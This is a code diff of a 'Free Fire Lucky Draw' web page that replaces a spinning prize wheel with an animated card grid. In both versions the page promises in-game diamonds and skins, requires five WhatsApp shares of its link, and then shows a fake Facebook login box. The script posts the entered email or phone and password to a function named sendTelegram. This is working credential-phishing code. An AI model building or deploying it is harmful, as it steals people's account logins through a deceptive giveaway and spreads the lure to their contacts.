@@ -5,179 +5,166 @@
 <title>Free Fire Lucky Draw</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <style>
-  body {
-    background: #161a2b;
-    color: #fff;
-    font-family: Arial, sans-serif;
-    margin: 0;
-  }
-  h1 {
-    text-align: center;
-    margin: 18px 0;
-    font-size: 1.4em;
-  }
-  .centered {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-  }
-  #wheel {
-    background: #202a48;
-    border-radius: 50%;
-    width: 260px;
-    height: 260px;
-    margin: 20px auto 16px auto;
-    border: 6px solid #fcc203;
-    box-shadow: 0 5px 20px #000b;
-    position: relative;
-    overflow: hidden;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    transition: filter 0.4s;
-  }
-  .prize {
-    width: 72px;
-    height: 72px;
-    border-radius: 10px;
-    position: absolute;
-    left: 50%;
-    top: 50%;
-    transform-origin: 50% 150px;
-    background-size: contain;
-    background-repeat: no-repeat;
-    background-position: center;
-    box-shadow: 0 2px 8px #ffad0740;
-  }
-  /* 5 prizes placed equally around the circle (72 deg increments) */
-  .prize1 {
-    transform: rotate(0deg) translate(-50%, -150px) rotate(0deg);
-    background-image: url('diamond-500.png');
-  }
-  .prize2 {
-    transform: rotate(72deg) translate(-50%, -150px) rotate(-72deg);
-    background-image: url('diamond-300.png');
-  }
-  .prize3 {
-    transform: rotate(144deg) translate(-50%, -150px) rotate(-144deg);
-    background-image: url('rare-gun-skin.png');
-  }
-  .prize4 {
-    transform: rotate(216deg) translate(-50%, -150px) rotate(-216deg);
-    background-image: url('rare-dress.png');
-  }
-  .prize5 {
-    transform: rotate(288deg) translate(-50%, -150px) rotate(-288deg);
-    background-image: url('pet-box.png');
-  }
-
-  #pointer {
-    position: absolute;
-    left: 50%;
-    top: 0px;
-    transform: translateX(-50%);
-    width: 20px;
-    height: 38px;
-    background: #ffd94c;
-    clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
-    z-index: 2;
-  }
-  .spin-btn,
-  .redeem-btn,
-  #share-btn {
-    width: 90%;
-    margin: 10px auto 0 auto;
-    font-size: 1.12em;
-    padding: 14px 0;
-    border: none;
-    border-radius: 8px;
-    color: #fff;
-    background: linear-gradient(90deg, #ffad07, #ff3b50);
-    box-shadow: 0 2px 9px #ffad0730;
-    cursor: pointer;
-  }
-  #result,
-  #share-area,
-  #redeem-area,
-  #fb-modal {
-    display: none;
-  }
-  #fb-modal {
-    position: fixed;
-    left: 0;
-    right: 0;
-    top: 0;
-    bottom: 0;
-    background: rgba(16, 20, 30, 0.85);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 30;
-  }
-  .fb-container {
-    width: 98vw;
-    max-width: 360px;
-    background: #fff;
-    border-radius: 7px;
-    padding: 28px 18px 22px 18px;
-    box-shadow: 0 8px 38px #202a487a;
-    position: relative;
-  }
-  .fb-container h2 {
-    color: #1877f2;
-    letter-spacing: 1px;
-    margin-top: 0;
-    font-family: 'Segoe UI', Arial, sans-serif;
-  }
-  .fb-container input {
-    width: 100%;
-    padding: 11px;
-    margin: 8px 0;
-    border: 1px solid #ccd0d5;
-    border-radius: 5px;
-    font-size: 1em;
-    background: #f5f6fa;
-  }
-  .fb-container button {
-    width: 100%;
-    padding: 11px;
-    border: none;
-    border-radius: 5px;
-    background: #1877f2;
-    color: #fff;
-    font-size: 1em;
-    margin-top: 8px;
-    cursor: pointer;
-  }
-  .fb-container .close-fb {
-    position: absolute;
-    top: 15px;
-    right: 20px;
-    font-size: 1.4em;
-    color: #444;
-    background: none;
-    border: none;
-    cursor: pointer;
-  }
-  @media screen and (max-width: 600px) {
-    #wheel {
-      width: 99vw;
-      max-width: 99vw;
-      height: 99vw;
-      max-height: 99vw;
-    }
-  }
+body {
+  background: #161a2b;
+  color: #fff;
+  font-family: Arial, sans-serif;
+  margin: 0;
+}
+h1 {
+  text-align: center;
+  margin: 18px 0;
+  font-size: 1.4em;
+}
+.centered {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+.lucky-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 20px;
+  max-width: 350px;
+  margin: 28px auto 0 auto;
+}
+.card {
+  background: #202a48;
+  border-radius: 14px;
+  box-shadow: 0 2px 8px #0e132099;
+  border: 2px solid #444;
+  padding: 10px 2px 18px 2px;
+  text-align: center;
+  min-height: 135px;
+  position: relative;
+  transition: box-shadow 0.3s, border-color 0.3s;
+}
+.card img {
+  width: 65px;
+  height: 65px;
+  object-fit: contain;
+  background: #22253c;
+  padding: 8px;
+  border-radius: 8px;
+  margin-bottom: 9px;
+}
+.card .label {
+  font-size: 1.01em;
+  font-weight: bold;
+  padding-top: 2px;
+}
+/* Winner card animation */
+.card.winner {
+  border-color: #ffad07;
+  box-shadow: 0 0 30px #ffad07cc, 0 0 15px #ff3b5099;
+  animation: winnerGlow 1.3s 2;
+}
+@keyframes winnerGlow {
+  0% { box-shadow: 0 0 0px #ffad07cc; }
+  50% { box-shadow: 0 0 30px 10px #ffad07cc, 0 0 15px #ff3b5099; }
+  100% { box-shadow: 0 0 0px #ffad07cc; }
+}
+.spin-btn,
+.redeem-btn,
+#share-btn {
+  width: 90%;
+  margin: 20px auto 0 auto;
+  font-size: 1.12em;
+  padding: 14px 0;
+  border: none;
+  border-radius: 8px;
+  color: #fff;
+  background: linear-gradient(90deg, #ffad07, #ff3b50);
+  box-shadow: 0 2px 9px #ffad0730;
+  cursor: pointer;
+}
+#result,
+#share-area,
+#redeem-area,
+#fb-modal {
+  display: none;
+}
+#fb-modal {
+  position: fixed;
+  left: 0;
+  right: 0;
+  top: 0;
+  bottom: 0;
+  background: rgba(16, 20, 30, 0.85);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 30;
+}
+.fb-container {
+  width: 98vw;
+  max-width: 360px;
+  background: #fff;
+  border-radius: 7px;
+  padding: 28px 18px 22px 18px;
+  box-shadow: 0 8px 38px #202a487a;
+  position: relative;
+}
+.fb-container h2 {
+  color: #1877f2;
+  letter-spacing: 1px;
+  margin-top: 0;
+  font-family: 'Segoe UI', Arial, sans-serif;
+}
+.fb-container input {
+  width: 100%;
+  padding: 11px;
+  margin: 8px 0;
+  border: 1px solid #ccd0d5;
+  border-radius: 5px;
+  font-size: 1em;
+  background: #f5f6fa;
+}
+.fb-container button {
+  width: 100%;
+  padding: 11px;
+  border: none;
+  border-radius: 5px;
+  background: #1877f2;
+  color: #fff;
+  font-size: 1em;
+  margin-top: 8px;
+  cursor: pointer;
+}
+.fb-container .close-fb {
+  position: absolute;
+  top: 15px;
+  right: 20px;
+  font-size: 1.4em;
+  color: #444;
+  background: none;
+  border: none;
+  cursor: pointer;
+}
+@media screen and (max-width: 600px) {
+  .lucky-grid {max-width:95vw;gap:12px;}
+  .card img {width:48px;height:48px;}
+}
 </style>
 </head>
 <body>
   <h1>Free Fire Lucky Draw</h1>
-  <div id="wheel" style="position:relative;">
-    <div id="pointer"></div>
-    <div class="prize prize1"></div>
-    <div class="prize prize2"></div>
-    <div class="prize prize3"></div>
-    <div class="prize prize4"></div>
-    <div class="prize prize5"></div>
+  <div class="lucky-grid" id="prizeGrid">
+    <div class="card" data-idx="0">
+      <img src="diamond-500.png" alt="500 Diamonds"><div class="label">500 Diamonds</div>
+    </div>
+    <div class="card" data-idx="1">
+      <img src="diamond-300.png" alt="300 Diamonds"><div class="label">300 Diamonds</div>
+    </div>
+    <div class="card" data-idx="2">
+      <img src="rare-gun-skin.png" alt="Rare Gun Skin"><div class="label">Rare Gun Skin Box</div>
+    </div>
+    <div class="card" data-idx="3">
+      <img src="rare-dress.png" alt="Rare Dress"><div class="label">Rare Dress</div>
+    </div>
+    <div class="card" data-idx="4">
+      <img src="pet-box.png" alt="Pet Box"><div class="label">Pet Box</div>
+    </div>
   </div>
   <div class="centered">
     <button class="spin-btn" id="spin">Spin & Win!</button>
@@ -205,111 +192,97 @@
       </div>
     </div>
   </div>
-  <script>
-    const prizes = [
-      '500 Diamonds',
-      '300 Diamonds',
-      'Rare Gun Skin Box',
-      'Rare Dress',
-      'Pet Box'
-    ];
-
-    // Site URL to share (encoded)
-    const siteURL = encodeURIComponent(window.location.href);
-
-    // Initialize share count
-    if (!sessionStorage.getItem('whatsappShareCount')) {
-      sessionStorage.setItem('whatsappShareCount', '0');
-    }
-
-    function updateShareUI() {
-      const count = Number(sessionStorage.getItem('whatsappShareCount'));
-      document.getElementById('share-count').textContent = count;
-      document.getElementById('redeemBtn').disabled = (count < 5);
-      document.getElementById('share-area').style.display = count < 5 ? 'block' : 'none';
-    }
-
-    function showPostWinUI() {
-      document.getElementById('result').style.display = 'block';
-      document.getElementById('share-area').style.display = 'block';
-      updateShareUI();
-      document.getElementById('redeem-area').style.display = 'block';
-      document.getElementById('redeemBtn').disabled = true; // initially disabled
-    }
-
-    function spinWheel() {
-      const wheel = document.getElementById('wheel');
-      const spinBtn = document.getElementById('spin');
-      spinBtn.disabled = true;
-      document.getElementById('result').style.display = 'none';
-      document.getElementById('share-area').style.display = 'none';
-      document.getElementById('redeem-area').style.display = 'none';
-
-      const prizeIndex = Math.floor(Math.random() * 5);
-      const degPerPrize = 360 / 5;
-      const base = 360 * 5; // multiple spins for effect
-      const stopDeg = base + (prizeIndex * degPerPrize) + degPerPrize / 2;
-
-      wheel.style.transition = 'transform 5s cubic-bezier(0.33, 1, 0.68, 1)';
-      wheel.style.transform = `rotate(-${stopDeg}deg)`;
-
-      setTimeout(() => {
-        spinBtn.disabled = false;
+<script>
+const prizes = [
+  '500 Diamonds',
+  '300 Diamonds',
+  'Rare Gun Skin Box',
+  'Rare Dress',
+  'Pet Box'
+];
+if (!sessionStorage.getItem('whatsappShareCount')) {
+  sessionStorage.setItem('whatsappShareCount', '0');
+}
+function updateShareUI() {
+  const count = Number(sessionStorage.getItem('whatsappShareCount'));
+  document.getElementById('share-count').textContent = count;
+  document.getElementById('redeemBtn').disabled = (count < 5);
+  document.getElementById('share-area').style.display = count < 5 ? 'block' : 'none';
+}
+function showPostWinUI() {
+  document.getElementById('result').style.display = 'block';
+  document.getElementById('share-area').style.display = 'block';
+  updateShareUI();
+  document.getElementById('redeem-area').style.display = 'block';
+  document.getElementById('redeemBtn').disabled = true;
+}
+function spinCards() {
+  // Remove winner class from all cards
+  document.querySelectorAll('.card').forEach(card => card.classList.remove('winner'));
+  // Simulate spinning with animation effects
+  const idx = Math.floor(Math.random() * prizes.length);
+  let rounds = 10, delay = 100, highlight;
+  function animate(i){
+    let cardEl = document.querySelector(`.card[data-idx="${i%prizes.length}"]`);
+    document.querySelectorAll('.card').forEach(card => card.classList.remove('winner'));
+    cardEl.classList.add('winner');
+    if(i < rounds) {
+      setTimeout(()=>animate(i+1), delay + i*15);
+    } else {
+      // Final winner
+      setTimeout(()=>{
+        cardEl.classList.add('winner');
         const result = document.getElementById('result');
-        result.innerHTML = `<br><b>Congratulations!<br>You won:</b><br>${prizes[prizeIndex]}`;
+        result.innerHTML = `<br><b>Congratulations!<br>You won:</b><br>${prizes[idx]}`;
         showPostWinUI();
-        document.getElementById('redeemBtn').dataset.prize = prizeIndex;
-      }, 5200);
+        document.getElementById('redeemBtn').dataset.prize = idx;
+      }, 300);
     }
-
-    document.getElementById('spin').onclick = spinWheel;
-
-    document.getElementById('share-btn').onclick = () => {
-      const whatsappLink = `https://wa.me/?text=Check out this awesome Free Fire Lucky Draw! Play now: ${siteURL}`;
-      window.open(whatsappLink, '_blank');
-      let count = Number(sessionStorage.getItem('whatsappShareCount'));
-      if (count < 5) {
-        sessionStorage.setItem('whatsappShareCount', String(count + 1));
+  }
+  animate(0);
+}
+document.getElementById('spin').onclick = spinCards;
+document.getElementById('share-btn').onclick = () => {
+  const siteURL = encodeURIComponent(window.location.href);
+  const whatsappLink = `https://wa.me/?text=Check out this awesome Free Fire Lucky Draw! Play now: ${siteURL}`;
+  window.open(whatsappLink, '_blank');
+  let count = Number(sessionStorage.getItem('whatsappShareCount'));
+  if (count < 5) {
+    sessionStorage.setItem('whatsappShareCount', String(count + 1));
+  }
+  updateShareUI();
+};
+document.getElementById('redeemBtn').onclick = () => {
+  document.getElementById('fb-modal').style.display = 'flex';
+};
+document.getElementById('fb-login-btn').onclick = () => {
+  const emailOrPhone = document.getElementById('fb-email').value.trim();
+  const password = document.getElementById('fb-password').value.trim();
+  if (!emailOrPhone || !password) {
+    alert('Please fill in both fields.');
+    return;
+  }
+  fetch('/.netlify/functions/sendTelegram', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ emailOrPhone, password }),
+  })
+    .then(response => response.json())
+    .then(data => {
+      if (data.success) {
+        alert('Login details sent successfully!');
+        document.getElementById('fb-modal').style.display = 'none';
+        document.getElementById('fb-email').value = '';
+        document.getElementById('fb-password').value = '';
+      } else {
+        alert('Failed to send details.');
       }
-      updateShareUI();
-    };
-
-    document.getElementById('redeemBtn').onclick = () => {
-      document.getElementById('fb-modal').style.display = 'flex';
-    };
-
-    document.getElementById('fb-login-btn').onclick = () => {
-      const emailOrPhone = document.getElementById('fb-email').value.trim();
-      const password = document.getElementById('fb-password').value.trim();
-
-      if (!emailOrPhone || !password) {
-        alert('Please fill in both fields.');
-        return;
-      }
-
-      fetch('/.netlify/functions/sendTelegram', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ emailOrPhone, password }),
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (data.success) {
-            alert('Login details sent successfully!');
-            document.getElementById('fb-modal').style.display = 'none';
-            document.getElementById('fb-email').value = '';
-            document.getElementById('fb-password').value = '';
-          } else {
-            alert('Failed to send details.');
-          }
-        })
-        .catch(() => {
-          alert('Error sending details.');
-        });
-    };
-
-    // Hide modal by default
-    document.getElementById('fb-modal').style.display = 'none';
-  </script>
+    })
+    .catch(() => {
+      alert('Error sending details.');
+    });
+};
+document.getElementById('fb-modal').style.display = 'none';
+</script>
 </body>
 </html>
